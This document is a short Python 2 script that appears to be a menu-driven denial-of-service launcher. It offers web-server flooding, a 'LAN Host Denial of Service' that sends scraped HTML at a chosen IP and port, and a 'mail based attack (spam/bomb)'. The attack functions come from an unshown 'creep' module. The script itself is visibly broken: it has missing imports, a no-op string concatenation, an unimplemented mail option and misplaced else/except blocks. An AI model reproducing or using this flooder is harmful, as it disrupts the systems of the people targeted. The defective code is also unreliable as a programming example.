#!/usr/bin/env python
# justest :))

from creep import webserver,collectgarbage,lanattack
import os
# webserverattack --> webserver(url,itter,packets)
# collectgarbage  --> collectegarbage(url) get html data and send all of these to target machine(webserver or whatever)
# lanattack       --> lanattack(ip,port,packets)   

def ask():

    os.system('clear')
    print """
        web >> web attack
        lan >> LAN Host Denial of Service
        mail >> mail based attack (spam/bomb)
        exit >> exit
        """
    try:
        while True:
            jawab = raw_input('.>  ')
            cmdlist=['web','lan','exit','mail']
            if jawab in cmdlist:
                if jawab == 'web':
                    try:
                        url=raw_input('> target url :')
                        itter=input('> itter :')
                        packets=collectgarbage('http://google.com')
                        webserver(url,itter,packets)
                    except Exception:
                        print '\n something were wrong !!'
                elif jawab == 'lan':
                    try:
                        iptgt=raw_input('> tgt ip :')
                        port=raw_input('> port :')
                        pckts = raw_input("> random ? Y/N")
                        if pckts == 'Y' or pckts == 'y':
                            url=['www.google.com','www.reddit.com','www.detik.com']
                            from random import choice
                            url= random.choice(url)
                            pckts=collectgarbage(url)
                        else:
                            url=raw_input('> url:')
                            if 'http://' not in url:
                                'http://'+url
                            else:
                                pass
                            pckts=collectgarbage(url)

                        lanattack(iptgt,port,pckts)
                    except Exception:
                        print 'something were wrong !!'

                elif jawab == 'exit':
                    sys.exit('[+] terminatting program...')
        else:
            print 'type help for more info.'
        except Exception:
            print 'something were wrong !!'
if __name__ == '__main__':
    ask()
